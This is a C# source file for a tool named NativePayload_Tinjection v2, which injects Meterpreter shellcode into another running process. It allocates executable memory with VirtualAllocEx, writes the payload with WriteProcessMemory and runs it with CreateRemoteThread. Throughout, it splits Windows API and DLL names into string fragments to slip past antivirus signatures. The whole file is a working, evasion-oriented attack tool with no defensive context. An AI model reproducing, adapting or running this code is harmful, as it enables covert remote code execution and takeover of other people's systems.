using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace NativePayload_Tinjection2
{
    class Program
    {
        const int All = 0x001F0FFF;
        [Flags]
        public enum AllocationType
        {
            Commit = 0x00001000
        }

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x0040
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string DllFile);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

       // [DllImport("kernel32.dll")]
       // public static extern bool FreeLibrary(IntPtr Module);

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);
        
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
      
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate IntPtr call_OpenProces(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate IntPtr call_VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
     
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate bool call_WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate IntPtr call_CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        static void Main(string[] args)
        {

            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_Tinjection v2 , Published by Damon Mohammadbagher , 2020");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_Tinjection v2 , Injecting Meterpreter Payload bytes to Other Process");
            Console.WriteLine();

            /// step I
            string[] X = args[1].Split(',');
            int Injection_to_PID = Convert.ToInt32(args[0]);
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine("[!] Injection Started Time {0}", DateTime.Now.ToString());
            Console.WriteLine("[!] Payload Length {0}", X.Length.ToString());
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[>] Injecting Meterpreter Payload to ");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("{0}:{1} ", Process.GetProcessById(Injection_to_PID).ProcessName, Process.GetProcessById(Injection_to_PID).Id.ToString());
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("Process");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine();
            Console.WriteLine("[!] Thread Injection Done Time {0}", DateTime.Now.ToString());
            Console.WriteLine();


            byte[] Xpayload = new byte[X.Length];

            for (int i = 0; i < X.Length;)
            {
                Xpayload[i] = Convert.ToByte(X[i], 16);
                i++;
            }

            IntPtr DLLFile = LoadLibrary("c:\\" + "win" + "dows\\sy" + "stem32\\k" + "ernel" + "32" + "." + "dl" + "l");
            /// step1
            IntPtr FunctionCall_01 = GetProcAddress(DLLFile, "O"+"penProcess");
            call_OpenProces FunctionCall_01_Del = (call_OpenProces)Marshal.GetDelegateForFunctionPointer(FunctionCall_01, typeof(call_OpenProces));
            IntPtr Result_01 = FunctionCall_01_Del(All, false, Injection_to_PID);
            System.Threading.Thread.Sleep(5000);
            /// step2
            IntPtr FunctionCall_02 = GetProcAddress(DLLFile, "Virtual"+"Alloc"+"Ex");
            call_VirtualAllocEx FunctionCall_02_Del = (call_VirtualAllocEx)Marshal.GetDelegateForFunctionPointer(FunctionCall_02, typeof(call_VirtualAllocEx));
            IntPtr Result_02 = FunctionCall_02_Del(Result_01, IntPtr.Zero, (uint)Xpayload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
            System.Threading.Thread.Sleep(5000);
            /// step3
            UIntPtr _out = UIntPtr.Zero;
            IntPtr FunctionCall_03 = GetProcAddress(DLLFile, "W"+"rite"+"Process"+"Memory");
            call_WriteProcessMemory FunctionCall_03_Del = (call_WriteProcessMemory)Marshal.GetDelegateForFunctionPointer(FunctionCall_03, typeof(call_WriteProcessMemory));
            bool Result_03 = FunctionCall_03_Del(Result_01, Result_02, Xpayload, (uint)Xpayload.Length, out _out);
            System.Threading.Thread.Sleep(5000);
            IntPtr Result_04 = IntPtr.Zero;
            /// step4
            uint xTid = 0;
            IntPtr FunctionCall_04 = GetProcAddress(DLLFile, "Create"+"Rem"+"ote"+"Thread");
            call_CreateRemoteThread FunctionCall_04_Del = (call_CreateRemoteThread)Marshal.GetDelegateForFunctionPointer(FunctionCall_04, typeof(call_CreateRemoteThread));
            Result_04 = FunctionCall_04_Del(Result_01, IntPtr.Zero, 0, Result_02, IntPtr.Zero, 0, out xTid);
            System.Threading.Thread.Sleep(2000);

            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.Write("[!] kernel32.dll Delegate.Result[");Console.ForegroundColor = ConsoleColor.Yellow;Console.Write("{0}", Result_01.ToString("X8"));
            Console.ForegroundColor = ConsoleColor.DarkGreen; Console.Write("] <=> OpenProces <= GetDelegateForFunctionPointer[");Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("{0}", FunctionCall_01.ToString("X8"));Console.ForegroundColor = ConsoleColor.DarkGreen; Console.WriteLine("]");

            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.Write("[!] kernel32.dll Delegate.Result["); Console.ForegroundColor = ConsoleColor.Yellow; Console.Write("{0}", Result_02.ToString("X8"));
            Console.ForegroundColor = ConsoleColor.DarkGreen; Console.Write("] <=> VirtualAllocEx <= GetDelegateForFunctionPointer["); Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("{0}", FunctionCall_02.ToString("X8")); Console.ForegroundColor = ConsoleColor.DarkGreen; Console.WriteLine("]");

            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.Write("[!] kernel32.dll Delegate.Result["); Console.ForegroundColor = ConsoleColor.Yellow; Console.Write("{0}", Result_03.ToString());
            Console.ForegroundColor = ConsoleColor.DarkGreen; Console.Write("]     <=> WriteProcessMemory <= GetDelegateForFunctionPointer["); Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("{0}", FunctionCall_03.ToString("X8")); Console.ForegroundColor = ConsoleColor.DarkGreen; Console.WriteLine("]");

            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.Write("[!] kernel32.dll Delegate.Result["); Console.ForegroundColor = ConsoleColor.Yellow; Console.Write("{0}", Result_04.ToString("X8"));
            Console.ForegroundColor = ConsoleColor.DarkGreen; Console.Write("] <=> CreateRemoteThread <= GetDelegateForFunctionPointer["); Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("{0}", FunctionCall_04.ToString("X8")); Console.ForegroundColor = ConsoleColor.DarkGreen; Console.WriteLine("]");
            Console.ForegroundColor = ConsoleColor.Gray;

            Console.WriteLine();
            /// close
            CloseHandle(Result_04);
            CloseHandle(Result_01);
            // FreeLibrary(DLLFile);
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Bingo Meterpreter Session by Remote Thread Injection Method  ;)");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Gray;

        }

    }
}




